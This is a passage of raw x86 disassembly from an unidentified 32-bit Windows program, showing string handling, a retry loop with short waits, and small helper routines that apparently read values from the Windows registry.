  4088ab:	50                   	push   %eax
  4088ac:	8d 85 08 ff ff ff    	lea    -0xf8(%ebp),%eax
  4088b2:	57                   	push   %edi
  4088b3:	50                   	push   %eax
  4088b4:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4088b7:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4088ba:	50                   	push   %eax
  4088bb:	56                   	push   %esi
  4088bc:	ff 15 4c 02 41 00    	call   *0x41024c
  4088c2:	50                   	push   %eax
  4088c3:	8d 85 44 fc ff ff    	lea    -0x3bc(%ebp),%eax
  4088c9:	50                   	push   %eax
  4088ca:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4088cd:	50                   	push   %eax
  4088ce:	e8 47 73 00 00       	call   0x40fc1a
  4088d3:	83 c4 0c             	add    $0xc,%esp
  4088d6:	50                   	push   %eax
  4088d7:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4088da:	50                   	push   %eax
  4088db:	e8 34 73 00 00       	call   0x40fc14
  4088e0:	83 c4 0c             	add    $0xc,%esp
  4088e3:	50                   	push   %eax
  4088e4:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4088e7:	50                   	push   %eax
  4088e8:	e8 33 73 00 00       	call   0x40fc20
  4088ed:	83 c4 0c             	add    $0xc,%esp
  4088f0:	8b c8                	mov    %eax,%ecx
  4088f2:	ff 15 58 02 41 00    	call   *0x410258
  4088f8:	50                   	push   %eax
  4088f9:	e8 79 4b 00 00       	call   0x40d477
  4088fe:	59                   	pop    %ecx
  4088ff:	59                   	pop    %ecx
  408900:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  408903:	ff 15 54 02 41 00    	call   *0x410254
  408909:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40890c:	ff 15 54 02 41 00    	call   *0x410254
  408912:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  408915:	ff 15 54 02 41 00    	call   *0x410254
  40891b:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40891e:	ff 15 54 02 41 00    	call   *0x410254
  408924:	83 65 e8 00          	andl   $0x0,-0x18(%ebp)
  408928:	8b 1d 50 01 41 00    	mov    0x410150,%ebx
  40892e:	6a 01                	push   $0x1
  408930:	6a 25                	push   $0x25
  408932:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  408938:	ff 15 58 02 41 00    	call   *0x410258
  40893e:	50                   	push   %eax
  40893f:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  408945:	ff 15 f4 02 41 00    	call   *0x4102f4
  40894b:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  408951:	ff 15 f0 02 41 00    	call   *0x4102f0
  408957:	84 c0                	test   %al,%al
  408959:	0f 84 99 00 00 00    	je     0x4089f8
  40895f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  408962:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  408968:	50                   	push   %eax
  408969:	c6 45 fe 01          	movb   $0x1,-0x2(%ebp)
  40896d:	ff 15 ec 02 41 00    	call   *0x4102ec
  408973:	6a 06                	push   $0x6
  408975:	8b f0                	mov    %eax,%esi
  408977:	59                   	pop    %ecx
  408978:	8d bd 70 ff ff ff    	lea    -0x90(%ebp),%edi
  40897e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  408980:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  408986:	e8 fd c8 ff ff       	call   0x405288
  40898b:	50                   	push   %eax
  40898c:	e8 3b 73 00 00       	call   0x40fccc
  408991:	59                   	pop    %ecx
  408992:	8b f0                	mov    %eax,%esi
  408994:	6a 00                	push   $0x0
  408996:	6a 00                	push   $0x0
  408998:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  40899e:	ff 15 e8 02 41 00    	call   *0x4102e8
  4089a4:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  4089aa:	e8 d9 c8 ff ff       	call   0x405288
  4089af:	50                   	push   %eax
  4089b0:	56                   	push   %esi
  4089b1:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  4089b7:	ff 15 e4 02 41 00    	call   *0x4102e4
  4089bd:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  4089c3:	e8 c0 c8 ff ff       	call   0x405288
  4089c8:	50                   	push   %eax
  4089c9:	56                   	push   %esi
  4089ca:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  4089d0:	ff 15 18 02 41 00    	call   *0x410218
  4089d6:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  4089dc:	ff 15 e0 02 41 00    	call   *0x4102e0
  4089e2:	56                   	push   %esi
  4089e3:	e8 44 72 00 00       	call   0x40fc2c
  4089e8:	59                   	pop    %ecx
  4089e9:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  4089ef:	ff 15 58 02 41 00    	call   *0x410258
  4089f5:	50                   	push   %eax
  4089f6:	ff d3                	call   *%ebx
  4089f8:	6a 01                	push   $0x1
  4089fa:	6a 25                	push   $0x25
  4089fc:	8d 8d 18 ff ff ff    	lea    -0xe8(%ebp),%ecx
  408a02:	ff 15 58 02 41 00    	call   *0x410258
  408a08:	50                   	push   %eax
  408a09:	8d 8d 48 fd ff ff    	lea    -0x2b8(%ebp),%ecx
  408a0f:	ff 15 f4 02 41 00    	call   *0x4102f4
  408a15:	8d 8d 48 fd ff ff    	lea    -0x2b8(%ebp),%ecx
  408a1b:	ff 15 f0 02 41 00    	call   *0x4102f0
  408a21:	84 c0                	test   %al,%al
  408a23:	0f 84 99 00 00 00    	je     0x408ac2
  408a29:	8d 45 d0             	lea    -0x30(%ebp),%eax
  408a2c:	8d 8d 48 fd ff ff    	lea    -0x2b8(%ebp),%ecx
  408a32:	50                   	push   %eax
  408a33:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  408a37:	ff 15 ec 02 41 00    	call   *0x4102ec
  408a3d:	6a 06                	push   $0x6
  408a3f:	8b f0                	mov    %eax,%esi
  408a41:	59                   	pop    %ecx
  408a42:	8d bd 58 ff ff ff    	lea    -0xa8(%ebp),%edi
  408a48:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  408a4a:	8d 8d 58 ff ff ff    	lea    -0xa8(%ebp),%ecx
  408a50:	e8 33 c8 ff ff       	call   0x405288
  408a55:	50                   	push   %eax
  408a56:	e8 71 72 00 00       	call   0x40fccc
  408a5b:	59                   	pop    %ecx
  408a5c:	8b f0                	mov    %eax,%esi
  408a5e:	6a 00                	push   $0x0
  408a60:	6a 00                	push   $0x0
  408a62:	8d 8d 48 fd ff ff    	lea    -0x2b8(%ebp),%ecx
  408a68:	ff 15 e8 02 41 00    	call   *0x4102e8
  408a6e:	8d 8d 58 ff ff ff    	lea    -0xa8(%ebp),%ecx
  408a74:	e8 0f c8 ff ff       	call   0x405288
  408a79:	50                   	push   %eax
  408a7a:	56                   	push   %esi
  408a7b:	8d 8d 48 fd ff ff    	lea    -0x2b8(%ebp),%ecx
  408a81:	ff 15 e4 02 41 00    	call   *0x4102e4
  408a87:	8d 8d 58 ff ff ff    	lea    -0xa8(%ebp),%ecx
  408a8d:	e8 f6 c7 ff ff       	call   0x405288
  408a92:	50                   	push   %eax
  408a93:	56                   	push   %esi
  408a94:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  408a9a:	ff 15 18 02 41 00    	call   *0x410218
  408aa0:	8d 8d 48 fd ff ff    	lea    -0x2b8(%ebp),%ecx
  408aa6:	ff 15 e0 02 41 00    	call   *0x4102e0
  408aac:	56                   	push   %esi
  408aad:	e8 7a 71 00 00       	call   0x40fc2c
  408ab2:	59                   	pop    %ecx
  408ab3:	8d 8d 18 ff ff ff    	lea    -0xe8(%ebp),%ecx
  408ab9:	ff 15 58 02 41 00    	call   *0x410258
  408abf:	50                   	push   %eax
  408ac0:	ff d3                	call   *%ebx
  408ac2:	6a 01                	push   $0x1
  408ac4:	6a 25                	push   $0x25
  408ac6:	8d 8d 08 ff ff ff    	lea    -0xf8(%ebp),%ecx
  408acc:	ff 15 58 02 41 00    	call   *0x410258
  408ad2:	50                   	push   %eax
  408ad3:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  408ad9:	ff 15 f4 02 41 00    	call   *0x4102f4
  408adf:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  408ae5:	ff 15 f0 02 41 00    	call   *0x4102f0
  408aeb:	84 c0                	test   %al,%al
  408aed:	0f 84 8d 00 00 00    	je     0x408b80
  408af3:	8d 45 a0             	lea    -0x60(%ebp),%eax
  408af6:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  408afc:	50                   	push   %eax
  408afd:	c6 45 fd 01          	movb   $0x1,-0x3(%ebp)
  408b01:	ff 15 ec 02 41 00    	call   *0x4102ec
  408b07:	6a 06                	push   $0x6
  408b09:	8b f0                	mov    %eax,%esi
  408b0b:	59                   	pop    %ecx
  408b0c:	8d 7d 88             	lea    -0x78(%ebp),%edi
  408b0f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  408b11:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  408b14:	e8 6f c7 ff ff       	call   0x405288
  408b19:	50                   	push   %eax
  408b1a:	e8 ad 71 00 00       	call   0x40fccc
  408b1f:	59                   	pop    %ecx
  408b20:	8b f0                	mov    %eax,%esi
  408b22:	6a 00                	push   $0x0
  408b24:	6a 00                	push   $0x0
  408b26:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  408b2c:	ff 15 e8 02 41 00    	call   *0x4102e8
  408b32:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  408b35:	e8 4e c7 ff ff       	call   0x405288
  408b3a:	50                   	push   %eax
  408b3b:	56                   	push   %esi
  408b3c:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  408b42:	ff 15 e4 02 41 00    	call   *0x4102e4
  408b48:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  408b4b:	e8 38 c7 ff ff       	call   0x405288
  408b50:	50                   	push   %eax
  408b51:	56                   	push   %esi
  408b52:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  408b58:	ff 15 18 02 41 00    	call   *0x410218
  408b5e:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  408b64:	ff 15 e0 02 41 00    	call   *0x4102e0
  408b6a:	56                   	push   %esi
  408b6b:	e8 bc 70 00 00       	call   0x40fc2c
  408b70:	59                   	pop    %ecx
  408b71:	8d 8d 08 ff ff ff    	lea    -0xf8(%ebp),%ecx
  408b77:	ff 15 58 02 41 00    	call   *0x410258
  408b7d:	50                   	push   %eax
  408b7e:	ff d3                	call   *%ebx
  408b80:	80 7d fe 00          	cmpb   $0x0,-0x2(%ebp)
  408b84:	74 0c                	je     0x408b92
  408b86:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  408b8a:	74 06                	je     0x408b92
  408b8c:	80 7d fd 00          	cmpb   $0x0,-0x3(%ebp)
  408b90:	75 3e                	jne    0x408bd0
  408b92:	68 f4 01 00 00       	push   $0x1f4
  408b97:	ff 15 8c 01 41 00    	call   *0x41018c
  408b9d:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  408ba3:	ff 15 dc 02 41 00    	call   *0x4102dc
  408ba9:	8d 8d 48 fd ff ff    	lea    -0x2b8(%ebp),%ecx
  408baf:	ff 15 dc 02 41 00    	call   *0x4102dc
  408bb5:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  408bbb:	ff 15 dc 02 41 00    	call   *0x4102dc
  408bc1:	ff 45 e8             	incl   -0x18(%ebp)
  408bc4:	83 7d e8 0a          	cmpl   $0xa,-0x18(%ebp)
  408bc8:	0f 8c 60 fd ff ff    	jl     0x40892e
  408bce:	eb 24                	jmp    0x408bf4
  408bd0:	8d 8d 68 fe ff ff    	lea    -0x198(%ebp),%ecx
  408bd6:	ff 15 dc 02 41 00    	call   *0x4102dc
  408bdc:	8d 8d 48 fd ff ff    	lea    -0x2b8(%ebp),%ecx
  408be2:	ff 15 dc 02 41 00    	call   *0x4102dc
  408be8:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  408bee:	ff 15 dc 02 41 00    	call   *0x4102dc
  408bf4:	8d 45 08             	lea    0x8(%ebp),%eax
  408bf7:	68 44 08 41 00       	push   $0x410844
  408bfc:	50                   	push   %eax
  408bfd:	ff 15 38 02 41 00    	call   *0x410238
  408c03:	59                   	pop    %ecx
  408c04:	59                   	pop    %ecx
  408c05:	84 c0                	test   %al,%al
  408c07:	6a 01                	push   $0x1
  408c09:	0f 84 e2 00 00 00    	je     0x408cf1
  408c0f:	83 ec 10             	sub    $0x10,%esp
  408c12:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
  408c18:	8b f4                	mov    %esp,%esi
  408c1a:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  408c20:	50                   	push   %eax
  408c21:	b8 68 52 41 00       	mov    $0x415268,%eax
  408c26:	50                   	push   %eax
  408c27:	51                   	push   %ecx
  408c28:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  408c2e:	50                   	push   %eax
  408c2f:	51                   	push   %ecx
  408c30:	8d 4d 18             	lea    0x18(%ebp),%ecx
  408c33:	50                   	push   %eax
  408c34:	51                   	push   %ecx
  408c35:	50                   	push   %eax
  408c36:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  408c3c:	68 08 12 41 00       	push   $0x411208
  408c41:	50                   	push   %eax
  408c42:	e8 d3 6f 00 00       	call   0x40fc1a
  408c47:	83 c4 0c             	add    $0xc,%esp
  408c4a:	50                   	push   %eax
  408c4b:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  408c51:	50                   	push   %eax
  408c52:	e8 bd 6f 00 00       	call   0x40fc14
  408c57:	83 c4 0c             	add    $0xc,%esp
  408c5a:	50                   	push   %eax
  408c5b:	8d 45 90             	lea    -0x70(%ebp),%eax
  408c5e:	50                   	push   %eax
  408c5f:	e8 b0 6f 00 00       	call   0x40fc14
  408c64:	83 c4 0c             	add    $0xc,%esp
  408c67:	50                   	push   %eax
  408c68:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408c6b:	50                   	push   %eax
  408c6c:	e8 a3 6f 00 00       	call   0x40fc14
  408c71:	83 c4 0c             	add    $0xc,%esp
  408c74:	50                   	push   %eax
  408c75:	8d 45 a8             	lea    -0x58(%ebp),%eax
  408c78:	50                   	push   %eax
  408c79:	e8 96 6f 00 00       	call   0x40fc14
  408c7e:	83 c4 0c             	add    $0xc,%esp
  408c81:	50                   	push   %eax
  408c82:	8d 45 d8             	lea    -0x28(%ebp),%eax
  408c85:	50                   	push   %eax
  408c86:	e8 89 6f 00 00       	call   0x40fc14
  408c8b:	83 c4 0c             	add    $0xc,%esp
  408c8e:	50                   	push   %eax
  408c8f:	8d 45 c0             	lea    -0x40(%ebp),%eax
  408c92:	50                   	push   %eax
  408c93:	e8 7c 6f 00 00       	call   0x40fc14
  408c98:	83 c4 0c             	add    $0xc,%esp
  408c9b:	50                   	push   %eax
  408c9c:	56                   	push   %esi
  408c9d:	e8 72 6f 00 00       	call   0x40fc14
  408ca2:	83 c4 0c             	add    $0xc,%esp
  408ca5:	e8 45 99 ff ff       	call   0x4025ef
  408caa:	83 c4 14             	add    $0x14,%esp
  408cad:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  408cb0:	ff 15 54 02 41 00    	call   *0x410254
  408cb6:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408cb9:	ff 15 54 02 41 00    	call   *0x410254
  408cbf:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  408cc2:	ff 15 54 02 41 00    	call   *0x410254
  408cc8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408ccb:	ff 15 54 02 41 00    	call   *0x410254
  408cd1:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  408cd4:	ff 15 54 02 41 00    	call   *0x410254
  408cda:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  408ce0:	ff 15 54 02 41 00    	call   *0x410254
  408ce6:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  408cec:	e9 dd 00 00 00       	jmp    0x408dce
  408cf1:	83 ec 10             	sub    $0x10,%esp
  408cf4:	8d 85 28 ff ff ff    	lea    -0xd8(%ebp),%eax
  408cfa:	8b f4                	mov    %esp,%esi
  408cfc:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  408d02:	50                   	push   %eax
  408d03:	b8 68 52 41 00       	mov    $0x415268,%eax
  408d08:	50                   	push   %eax
  408d09:	51                   	push   %ecx
  408d0a:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  408d10:	50                   	push   %eax
  408d11:	51                   	push   %ecx
  408d12:	8d 4d 18             	lea    0x18(%ebp),%ecx
  408d15:	50                   	push   %eax
  408d16:	51                   	push   %ecx
  408d17:	50                   	push   %eax
  408d18:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408d1b:	68 fc 11 41 00       	push   $0x4111fc
  408d20:	50                   	push   %eax
  408d21:	e8 f4 6e 00 00       	call   0x40fc1a
  408d26:	83 c4 0c             	add    $0xc,%esp
  408d29:	50                   	push   %eax
  408d2a:	8d 45 a8             	lea    -0x58(%ebp),%eax
  408d2d:	50                   	push   %eax
  408d2e:	e8 e1 6e 00 00       	call   0x40fc14
  408d33:	83 c4 0c             	add    $0xc,%esp
  408d36:	50                   	push   %eax
  408d37:	8d 45 d8             	lea    -0x28(%ebp),%eax
  408d3a:	50                   	push   %eax
  408d3b:	e8 d4 6e 00 00       	call   0x40fc14
  408d40:	83 c4 0c             	add    $0xc,%esp
  408d43:	50                   	push   %eax
  408d44:	8d 45 c0             	lea    -0x40(%ebp),%eax
  408d47:	50                   	push   %eax
  408d48:	e8 c7 6e 00 00       	call   0x40fc14
  408d4d:	83 c4 0c             	add    $0xc,%esp
  408d50:	50                   	push   %eax
  408d51:	8d 45 90             	lea    -0x70(%ebp),%eax
  408d54:	50                   	push   %eax
  408d55:	e8 ba 6e 00 00       	call   0x40fc14
  408d5a:	83 c4 0c             	add    $0xc,%esp
  408d5d:	50                   	push   %eax
  408d5e:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  408d64:	50                   	push   %eax
  408d65:	e8 aa 6e 00 00       	call   0x40fc14
  408d6a:	83 c4 0c             	add    $0xc,%esp
  408d6d:	50                   	push   %eax
  408d6e:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  408d74:	50                   	push   %eax
  408d75:	e8 9a 6e 00 00       	call   0x40fc14
  408d7a:	83 c4 0c             	add    $0xc,%esp
  408d7d:	50                   	push   %eax
  408d7e:	56                   	push   %esi
  408d7f:	e8 90 6e 00 00       	call   0x40fc14
  408d84:	83 c4 0c             	add    $0xc,%esp
  408d87:	e8 63 98 ff ff       	call   0x4025ef
  408d8c:	83 c4 14             	add    $0x14,%esp
  408d8f:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  408d95:	ff 15 54 02 41 00    	call   *0x410254
  408d9b:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  408da1:	ff 15 54 02 41 00    	call   *0x410254
  408da7:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  408daa:	ff 15 54 02 41 00    	call   *0x410254
  408db0:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  408db3:	ff 15 54 02 41 00    	call   *0x410254
  408db9:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408dbc:	ff 15 54 02 41 00    	call   *0x410254
  408dc2:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  408dc5:	ff 15 54 02 41 00    	call   *0x410254
  408dcb:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  408dce:	ff 15 54 02 41 00    	call   *0x410254
  408dd4:	8d 8d 08 ff ff ff    	lea    -0xf8(%ebp),%ecx
  408dda:	ff 15 54 02 41 00    	call   *0x410254
  408de0:	8d 8d 18 ff ff ff    	lea    -0xe8(%ebp),%ecx
  408de6:	ff 15 54 02 41 00    	call   *0x410254
  408dec:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  408df2:	ff 15 54 02 41 00    	call   *0x410254
  408df8:	8d 8d 28 ff ff ff    	lea    -0xd8(%ebp),%ecx
  408dfe:	ff 15 54 02 41 00    	call   *0x410254
  408e04:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  408e0a:	ff 15 54 02 41 00    	call   *0x410254
  408e10:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  408e16:	ff 15 54 02 41 00    	call   *0x410254
  408e1c:	8d 4d 08             	lea    0x8(%ebp),%ecx
  408e1f:	ff 15 54 02 41 00    	call   *0x410254
  408e25:	8d 4d 18             	lea    0x18(%ebp),%ecx
  408e28:	ff 15 54 02 41 00    	call   *0x410254
  408e2e:	8d 4d 28             	lea    0x28(%ebp),%ecx
  408e31:	ff 15 54 02 41 00    	call   *0x410254
  408e37:	8d 4d 38             	lea    0x38(%ebp),%ecx
  408e3a:	ff 15 54 02 41 00    	call   *0x410254
  408e40:	8d 4d 48             	lea    0x48(%ebp),%ecx
  408e43:	ff 15 54 02 41 00    	call   *0x410254
  408e49:	5f                   	pop    %edi
  408e4a:	5e                   	pop    %esi
  408e4b:	5b                   	pop    %ebx
  408e4c:	c9                   	leave
  408e4d:	c3                   	ret
  408e4e:	55                   	push   %ebp
  408e4f:	8b ec                	mov    %esp,%ebp
  408e51:	8d 45 0c             	lea    0xc(%ebp),%eax
  408e54:	56                   	push   %esi
  408e55:	50                   	push   %eax
  408e56:	33 f6                	xor    %esi,%esi
  408e58:	68 19 00 02 00       	push   $0x20019
  408e5d:	56                   	push   %esi
  408e5e:	ff 75 0c             	push   0xc(%ebp)
  408e61:	ff 75 08             	push   0x8(%ebp)
  408e64:	ff 15 28 00 41 00    	call   *0x410028
  408e6a:	85 c0                	test   %eax,%eax
  408e6c:	75 24                	jne    0x408e92
  408e6e:	57                   	push   %edi
  408e6f:	56                   	push   %esi
  408e70:	56                   	push   %esi
  408e71:	56                   	push   %esi
  408e72:	56                   	push   %esi
  408e73:	ff 75 10             	push   0x10(%ebp)
  408e76:	ff 75 0c             	push   0xc(%ebp)
  408e79:	ff 15 34 00 41 00    	call   *0x410034
  408e7f:	ff 75 0c             	push   0xc(%ebp)
  408e82:	8b f8                	mov    %eax,%edi
  408e84:	ff 15 30 00 41 00    	call   *0x410030
  408e8a:	3b fe                	cmp    %esi,%edi
  408e8c:	5f                   	pop    %edi
  408e8d:	0f 94 c0             	sete   %al
  408e90:	eb 02                	jmp    0x408e94
  408e92:	32 c0                	xor    %al,%al
  408e94:	5e                   	pop    %esi
  408e95:	5d                   	pop    %ebp
  408e96:	c3                   	ret
  408e97:	55                   	push   %ebp
  408e98:	8b ec                	mov    %esp,%ebp
  408e9a:	51                   	push   %ecx
  408e9b:	51                   	push   %ecx
  408e9c:	6a 04                	push   $0x4
  408e9e:	58                   	pop    %eax
  408e9f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408ea2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408ea5:	8d 45 0c             	lea    0xc(%ebp),%eax
  408ea8:	50                   	push   %eax
  408ea9:	68 19 00 02 00       	push   $0x20019
  408eae:	6a 00                	push   $0x0
  408eb0:	ff 75 0c             	push   0xc(%ebp)
  408eb3:	ff 75 08             	push   0x8(%ebp)
  408eb6:	ff 15 28 00 41 00    	call   *0x410028
  408ebc:	85 c0                	test   %eax,%eax
  408ebe:	75 2d                	jne    0x408eed
  408ec0:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408ec3:	56                   	push   %esi
  408ec4:	50                   	push   %eax
  408ec5:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408ec8:	ff 75 14             	push   0x14(%ebp)
  408ecb:	50                   	push   %eax
  408ecc:	6a 00                	push   $0x0
  408ece:	ff 75 10             	push   0x10(%ebp)
  408ed1:	ff 75 0c             	push   0xc(%ebp)
  408ed4:	ff 15 34 00 41 00    	call   *0x410034
  408eda:	ff 75 0c             	push   0xc(%ebp)
  408edd:	8b f0                	mov    %eax,%esi
  408edf:	ff 15 30 00 41 00    	call   *0x410030
  408ee5:	85 f6                	test   %esi,%esi
  408ee7:	0f 94 c0             	sete   %al
  408eea:	5e                   	pop    %esi
  408eeb:	c9                   	leave
  408eec:	c3                   	ret
  408eed:	32 c0                	xor    %al,%al
  408eef:	c9                   	leave
  408ef0:	c3                   	ret
  408ef1:	55                   	push   %ebp
  408ef2:	8b ec                	mov    %esp,%ebp
  408ef4:	81 ec 04 04 00 00    	sub    $0x404,%esp
  408efa:	8d 45 0c             	lea    0xc(%ebp),%eax
  408efd:	c7 45 fc 00 04 00 00 	movl   $0x400,-0x4(%ebp)
  408f04:	50                   	push   %eax
  408f05:	68 19 00 02 00       	push   $0x20019
  408f0a:	6a 00                	push   $0x0
  408f0c:	ff 75 10             	push   0x10(%ebp)
  408f0f:	ff 75 0c             	push   0xc(%ebp)
  408f12:	ff 15 28 00 41 00    	call   *0x410028
  408f18:	85 c0                	test   %eax,%eax
  408f1a:	75 31                	jne    0x408f4d
  408f1c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408f1f:	50                   	push   %eax
  408f20:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  408f26:	50                   	push   %eax
  408f27:	6a 00                	push   $0x0
  408f29:	6a 00                	push   $0x0
  408f2b:	ff 75 14             	push   0x14(%ebp)
  408f2e:	ff 75 0c             	push   0xc(%ebp)
  408f31:	ff 15 34 00 41 00    	call   *0x410034
  408f37:	ff 75 0c             	push   0xc(%ebp)
  408f3a:	ff 15 30 00 41 00    	call   *0x410030
  408f40:	8d 45 13             	lea    0x13(%ebp),%eax
  408f43:	50                   	push   %eax
  408f44:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  408f4a:	50                   	push   %eax
  408f4b:	eb 09                	jmp    0x408f56
  408f4d:	8d 45 13             	lea    0x13(%ebp),%eax
  408f50:	50                   	push   %eax
  408f51:	68 68 06 41 00       	push   $0x410668
  408f56:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408f59:	ff 15 4c 02 41 00    	call   *0x41024c
  408f5f:	8b 45 08             	mov    0x8(%ebp),%eax
  408f62:	c9                   	leave
  408f63:	c3                   	ret
  408f64:	55                   	push   %ebp
  408f65:	8b ec                	mov    %esp,%ebp
  408f67:	81 ec 0c 04 00 00    	sub    $0x40c,%esp
  408f6d:	8d 45 0c             	lea    0xc(%ebp),%eax
  408f70:	50                   	push   %eax
  408f71:	68 19 00 02 00       	push   $0x20019
  408f76:	6a 00                	push   $0x0
  408f78:	ff 75 0c             	push   0xc(%ebp)
  408f7b:	ff 75 08             	push   0x8(%ebp)
  408f7e:	ff 15 28 00 41 00    	call   *0x410028
  408f84:	85 c0                	test   %eax,%eax
  408f86:	75 4e                	jne    0x408fd6
  408f88:	8d 45 08             	lea    0x8(%ebp),%eax
  408f8b:	57                   	push   %edi
  408f8c:	50                   	push   %eax
  408f8d:	ff 75 14             	push   0x14(%ebp)
  408f90:	6a 00                	push   $0x0
  408f92:	6a 00                	push   $0x0
  408f94:	ff 75 10             	push   0x10(%ebp)
  408f97:	ff 75 0c             	push   0xc(%ebp)
  408f9a:	ff 15 34 00 41 00    	call   *0x410034
  408fa0:	ff 75 0c             	push   0xc(%ebp)
  408fa3:	8b f8                	mov    %eax,%edi
  408fa5:	ff 15 30 00 41 00    	call   *0x410030
  408fab:	85 ff                	test   %edi,%edi
  408fad:	5f                   	pop    %edi
  408fae:	75 26                	jne    0x408fd6
  408fb0:	ff 75 1c             	push   0x1c(%ebp)
  408fb3:	8d 8d f4 fb ff ff    	lea    -0x40c(%ebp),%ecx
  408fb9:	ff 75 18             	push   0x18(%ebp)
  408fbc:	e8 2a 99 ff ff       	call   0x4028eb
  408fc1:	ff 75 08             	push   0x8(%ebp)
  408fc4:	8d 8d f4 fb ff ff    	lea    -0x40c(%ebp),%ecx
  408fca:	ff 75 14             	push   0x14(%ebp)
  408fcd:	e8 bc 99 ff ff       	call   0x40298e
  408fd2:	b0 01                	mov    $0x1,%al
  408fd4:	c9                   	leave
  408fd5:	c3                   	ret
  408fd6:	32 c0                	xor    %al,%al
  408fd8:	c9                   	leave
  408fd9:	c3                   	ret
  408fda:	55                   	push   %ebp
  408fdb:	8b ec                	mov    %esp,%ebp
  408fdd:	8d 45 0c             	lea    0xc(%ebp),%eax
  408fe0:	50                   	push   %eax
  408fe1:	ff 75 0c             	push   0xc(%ebp)
  408fe4:	ff 75 08             	push   0x8(%ebp)
  408fe7:	ff 15 20 00 41 00    	call   *0x410020
  408fed:	85 c0                	test   %eax,%eax
  408fef:	75 48                	jne    0x409039
  408ff1:	53                   	push   %ebx
  408ff2:	56                   	push   %esi
  408ff3:	8d 4d 14             	lea    0x14(%ebp),%ecx
  408ff6:	ff 15 90 02 41 00    	call   *0x410290
  408ffc:	50                   	push   %eax
  408ffd:	8d 4d 14             	lea    0x14(%ebp),%ecx
  409000:	ff 15 58 02 41 00    	call   *0x410258
  409006:	50                   	push   %eax
  409007:	33 db                	xor    %ebx,%ebx
  409009:	ff 75 24             	push   0x24(%ebp)
  40900c:	53                   	push   %ebx
  40900d:	ff 75 10             	push   0x10(%ebp)
  409010:	ff 75 0c             	push   0xc(%ebp)
  409013:	ff 15 24 00 41 00    	call   *0x410024
